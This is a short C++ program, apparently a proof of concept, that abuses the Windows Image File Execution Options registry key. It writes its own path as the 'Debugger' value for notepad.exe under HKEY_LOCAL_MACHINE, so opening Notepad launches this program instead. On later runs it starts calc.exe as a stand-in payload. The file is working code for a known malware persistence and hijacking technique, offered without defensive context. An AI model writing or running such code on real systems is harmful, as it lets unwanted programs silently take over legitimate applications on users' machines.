#include "Registry.h"
#include <stdlib.h>
#include <iostream>
#include <Windows.h>

using namespace winapi4humans;

const wchar_t* GetWC1(const char* c)
{
	const size_t cSize = strlen(c) + 1;
	wchar_t* wc = new wchar_t[cSize];
	mbstowcs(wc, c, cSize);

	return wc;
}

int main(int argc, char* argv[]) {

	LPCWSTR data;
	DWORD	size = 0;
	LPCWSTR path = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"; // registry startup key
	LPCWSTR keypath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe"; // registry startup key

	LPCWSTR name = L"Debugger";

	 Registry::readValue(HKEY_LOCAL_MACHINE, keypath, name, &data, &size);

	if (size == 0) {

		Registry::createKey(HKEY_LOCAL_MACHINE, keypath);

		data = GetWC1(argv[0]);
		size = wcslen(data) * sizeof(WCHAR);

		Registry::writeValue(HKEY_LOCAL_MACHINE, keypath, name, REG_SZ, data, size);
	}
	else {
		system("calc.exe");
	}


	return 0;
}